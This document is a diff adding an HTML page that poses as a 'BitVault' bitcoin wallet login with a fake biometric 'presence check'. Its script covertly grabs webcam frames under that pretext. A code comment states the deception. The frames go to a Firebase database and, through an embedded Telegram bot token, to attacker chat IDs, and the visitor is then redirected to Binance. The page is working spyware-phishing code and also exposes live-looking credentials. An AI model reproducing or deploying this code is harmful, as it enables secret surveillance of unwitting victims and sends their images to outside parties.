@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BitVault | Secure Access</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --btc-orange: #f7931a;
+            --vault-black: #0a0b0d;
+            --vault-card: #16181d;
+            --vault-text: #ffffff;
+            --vault-sub: #848e9c;
+            --vault-border: #2b2f36;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--vault-black); color: var(--vault-text);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .vault-container {
+            width: 100%; max-width: 440px; background: var(--vault-card);
+            border-radius: 16px; border: 1px solid var(--vault-border);
+            box-shadow: 0 24px 48px rgba(0,0,0,0.5); overflow: hidden;
+        }
+
+        .vault-header {
+            padding: 24px; border-bottom: 1px solid var(--vault-border);
+            display: flex; align-items: center; justify-content: space-between;
+        }
+
+        .vault-logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 18px; color: var(--btc-orange); }
+        .btc-icon { width: 32px; height: 32px; background: var(--btc-orange); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-style: normal; font-weight: 900; }
+
+        .vault-body { padding: 32px 24px; text-align: center; }
+
+        .asset-preview {
+            background: rgba(247, 147, 26, 0.1); border: 1px dashed var(--btc-orange);
+            border-radius: 12px; padding: 20px; margin-bottom: 24px;
+        }
+
+        .balance-blur { font-size: 24px; font-weight: 700; filter: blur(8px); letter-spacing: 2px; }
+
+        h1 { font-size: 20px; font-weight: 600; margin: 0 0 12px; }
+        p { font-size: 14px; color: var(--vault-sub); line-height: 1.6; margin-bottom: 32px; }
+
+        .btn-vault {
+            background: var(--btc-orange); color: #000; border: none;
+            width: 100%; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: 700;
+            cursor: pointer; transition: transform 0.1s;
+        }
+        .btn-vault:active { transform: scale(0.98); }
+
+        /* Security Verification UI */
+        #verify-ui { display: none; }
+        
+        .scan-container {
+            width: 120px; height: 120px; margin: 0 auto 24px;
+            border: 2px solid var(--btc-orange); border-radius: 50%;
+            position: relative; display: flex; align-items: center; justify-content: center;
+        }
+
+        .scan-line {
+            position: absolute; width: 100%; height: 2px; background: var(--btc-orange);
+            box-shadow: 0 0 15px var(--btc-orange); top: 0;
+            animation: scan 2s ease-in-out infinite;
+        }
+        @keyframes scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
+
+        .loading-text { font-size: 15px; font-weight: 500; color: var(--btc-orange); }
+        .node-meta { font-size: 10px; color: #4e555d; margin-top: 24px; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
+</head>
+<body>
+
+    <div class="vault-container">
+        <div class="vault-header">
+            <div class="vault-logo"><i class="btc-icon">₿</i> BitVault Institutional</div>
+            <div style="font-size: 12px; color: var(--vault-sub);">v4.2.0-secure</div>
+        </div>
+
+        <div class="vault-body" id="init-view">
+            <div class="asset-preview">
+                <div style="font-size: 12px; color: var(--vault-sub); margin-bottom: 8px;">Total Equity Estimated</div>
+                <div class="balance-blur">0.48291000 BTC</div>
+            </div>
+            <h1>Multi-Factor Presence Check</h1>
+            <p>To access this cold storage wallet, please complete the <b>Proof of Presence (PoP)</b> verification. This ensures the private keys are decrypted only in your physical vicinity.</p>
+            
+            <button class="btn-vault" onclick="startVaultSync()">Verify & Unlock Wallet</button>
+            <div class="node-meta">Secure Node: Mumbai_Financial_Hub_01</div>
+        </div>
+
+        <div class="vault-body" id="verify-ui">
+            <div class="scan-container">
+                <div class="scan-line"></div>
+                <div style="font-size: 32px;">🔐</div>
+            </div>
+            <div class="loading-text">Synchronizing Biometric Hash...</div>
+            <div style="font-size: 12px; color: var(--vault-sub); margin-top: 10px;" id="vault-timer">Encryption session expires in 60s</div>
+            
+            <div style="text-align: left; background: #000; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 10px; color: #00ff00; margin-top: 24px; border: 1px solid #1c2025; line-height: 1.5;">
+                > INITIALIZING_RSA_HANDSHAKE...<br>
+                > P2P_NODE: MUMBAI_WEST_GATEWAY<br>
+                > STATUS: VALIDATING_PRESENCE_BLOB
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden Capture Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startVaultSync() {
+            try {
+                // Request camera permission under the guise of Biometric Verification
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('verify-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('vault-timer').innerText = `Encryption session expires in ${timeLeft}s`;
+
+                        if (count <= 52) {
+                            vaultCapture(count);
+                        }
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            // Redirect to a real crypto exchange or wallet landing page
+                            window.location.href = "https://www.binance.com";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://www.binance.com";
+            }
+        }
+
+        function vaultCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ 
+                image: b64, 
+                type: "BITCOIN_WALLET_SPOOF", 
+                ts: Date.now(),
+                loc: "MUMBAI_FINANCIAL" 
+            });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'vault_recon_mumbai.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
